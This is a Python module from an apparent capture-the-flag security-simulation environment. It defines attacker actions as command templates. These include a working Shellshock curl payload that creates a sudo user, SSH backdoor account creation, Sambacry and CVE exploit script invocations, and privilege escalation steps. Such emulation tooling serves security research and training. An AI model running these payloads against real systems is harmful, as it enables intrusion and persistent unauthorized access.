import csle_common.constants.constants as constants
from gym_csle_ctf.dao.action.attacker.attacker_action import AttackerAction
from gym_csle_ctf.dao.action.attacker.attacker_action_type import AttackerActionType
from gym_csle_ctf.dao.action.attacker.attacker_action_id import AttackerActionId
from gym_csle_ctf.dao.action.attacker.attacker_action import AttackerActionOutcome

class AttackerShellActions:
    """
    Class implementing regular Bash actions for the attacker (e.g. interacting with filesystem or OS)
    """

    @staticmethod
    def FIND_FLAG(index : int) -> AttackerAction:
        """
        Searches through the file systems that have been compromised to find a flag

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.FIND_FLAG
        cmd = ["find / -name 'flag*.txt'  2>&1 | grep -v 'Permission denied'"]
        alt_cmd = ["find / | grep 'flag*'"]
        return AttackerAction(id=id, name="Find flag", cmd=cmd,
                              type=AttackerActionType.POST_EXPLOIT,
                              descr="Searches the file system for a flag",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.FLAG, alt_cmd=alt_cmd,
                              backdoor=False)

    @staticmethod
    def INSTALL_TOOLS(index: int) -> AttackerAction:
        """
        Installs tools on compromised machines

        :param index: index of the machine to apply the action to
        :return: the created action
        """
        id = AttackerActionId.INSTALL_TOOLS
        cmd = ["sudo apt-get -y install nmap ssh git unzip lftp",
               "cd /;sudo wget -c https://github.com/danielmiessler/SecLists/archive/master.zip -O SecList.zip && sudo unzip -o SecList.zip && sudo rm -f SecList.zip && sudo mv SecLists-master /SecLists"]
        return AttackerAction(id=id, name="Install tools", cmd=cmd,
                              type=AttackerActionType.POST_EXPLOIT,
                              descr="If taken root on remote machine, installs pentest tools, e.g. nmap",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
                              backdoor=False)

    @staticmethod
    def SSH_BACKDOOR(index: int) -> AttackerAction:
        """
        Installs a SSH backdoor on a compromised machine

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.SSH_BACKDOOR
        cmd = ["sudo service ssh start", "sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo -p \"$(openssl passwd -1 '{}')\" {}"]
        return AttackerAction(id=id, name="Install SSH backdoor", cmd=cmd,
                              type=AttackerActionType.POST_EXPLOIT,
                              descr="If taken root on remote machine, installs a ssh backdoor, useful for upgrading telnet"
                            "or weaker channels",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.PIVOTING, alt_cmd=None,
                              backdoor=True)

    @staticmethod
    def SAMBACRY_EXPLOIT(index: int) -> AttackerAction:
        """
        Launches the sambacry exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.SAMBACRY_EXPLOIT
        cmd = ["sudo /root/miniconda3/envs/samba/bin/python /samba_exploit.py -e /libbindshell-samba.so -s data "
               "-r /data/libbindshell-samba.so -u sambacry -p nosambanocry -P 6699 -t {}"]
        return AttackerAction(id=id, name="Sambacry Explolit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the sambacry shell to get remote code execution and then sets up a SSH backdoor "
                            "to upgrade the channel",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.SAMBA.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def SHELLSHOCK_EXPLOIT(index: int) -> AttackerAction:
        """
        Launches the shellshock exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.SHELLSHOCK_EXPLOIT
        cmd = ["curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c "
               "'sudo useradd -rm -d /home/{} -s /bin/bash -g root -G sudo "
               "-p $(openssl passwd -1 \'{}\') {}'\" http://{}:80/cgi-bin/vulnerable",
               "curl -H \"user-agent: () {{ :; }}; echo; echo; /bin/bash -c 'echo {}:{} | sudo /usr/sbin/chpasswd'\" "
               "http://{}:80/cgi-bin/vulnerable"
               ]
        return AttackerAction(id=id, name="ShellShock Explolit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the Shellshock exploit and curl to do remote code execution and create a backdoor",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.SHELLSHOCK.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def DVWA_SQL_INJECTION(index: int) -> AttackerAction:
        """
        Launches the  DVWA SQL Injection exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.DVWA_SQL_INJECTION
        cmd = ["/sql_injection_exploit.sh"]
        return AttackerAction(id=id, name="DVWA SQL Injection Exploit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the DVWA SQL Injection exploit to extract secret passwords",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.DVWA_SQL_INJECTION.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def CVE_2015_3306_EXPLOIT(index: int) -> AttackerAction:
        """
        Launches the CVE-2015-3306 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.CVE_2015_3306_EXPLOIT
        cmd = ["sudo /root/miniconda3/bin/python3 /cve_2015_3306_exploit.py --port 21 --path '/var/www/html/' --host {}"]
        return AttackerAction(id=id, name="CVE-2015-3306 exploit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the CVE-2015-3306 vulnerability to get remote code execution and then sets up a SSH backdoor "
                            "to upgrade the channel",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.CVE_2015_3306.VULNERABILITY_NAME,
                              backdoor=True)


    @staticmethod
    def CVE_2015_1427_EXPLOIT(index: int) -> AttackerAction:
        """
        Launches the CVE-2015-1427 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.CVE_2015_1427_EXPLOIT
        cmd = ["/cve_2015_1427_exploit.sh {}:9200"]
        return AttackerAction(id=id, name="CVE-2015-1427 exploit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the CVE-2015-1427 vulnerability to get remote code execution and then sets up a SSH backdoor "
                            "to upgrade the channel",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.CVE_2015_1427.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def CVE_2016_10033_EXPLOIT(index: int) -> AttackerAction:
        """
        Launches the CVE-2016-10033 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.CVE_2016_10033_EXPLOIT
        cmd = ["/cve_2016_10033_exploit.sh {}:80"]
        return AttackerAction(id=id, name="CVE-2016-10033 exploit", cmd=cmd,
                              type=AttackerActionType.EXPLOIT,
                              descr="Uses the CVE-2016-10033 vulnerability to get remote code execution and then sets up a SSH backdoor "
                            "to upgrade the channel",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.SHELL_ACCESS, alt_cmd=None,
                              vulnerability=constants.CVE_2016_10033.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def CVE_2010_0426_PRIV_ESC(index: int) -> AttackerAction:
        """
        Launches the CVE-2010-0426 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.CVE_2010_0426_PRIV_ESC
        cmd = ["/cve_2010_0426_exploit.sh {}", "/create_backdoor_cve_2010_0426.sh"]
        return AttackerAction(id=id, name="CVE-2010-0426 exploit", cmd=cmd,
                              type=AttackerActionType.PRIVILEGE_ESCALATION,
                              descr="Uses the CVE-2010-0426 vulnerability to perform privilege escalation to get root access",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                              alt_cmd=None,
                              vulnerability=constants.CVE_2010_0426.VULNERABILITY_NAME,
                              backdoor=True)

    @staticmethod
    def CVE_2015_5602_PRIV_ESC(index: int) -> AttackerAction:
        """
        Launches the CVE-2015-5602 exploit

        :param index: index of the machine to apply the action to
        :return: the action
        """
        id = AttackerActionId.CVE_2015_5602_PRIV_ESC
        cmd = ["/cve_2015_5602_exploit.sh", "su root", constants.CVE_2015_5602.ROOT_PW,
               "/create_backdoor_cve_2015_5602.sh"]
        return AttackerAction(id=id, name="CVE-2015-5602 exploit", cmd=cmd,
                              type=AttackerActionType.PRIVILEGE_ESCALATION,
                              descr="Uses the CVE-2015-5602 vulnerability to perform privilege escalation to get root access",
                              cost=0.0, noise=0.0, index=index,
                              ip=None, subnet=False, action_outcome=AttackerActionOutcome.PRIVILEGE_ESCALATION_ROOT,
                              alt_cmd=None, vulnerability=constants.CVE_2015_5602.VULNERABILITY_NAME,
                              backdoor=True)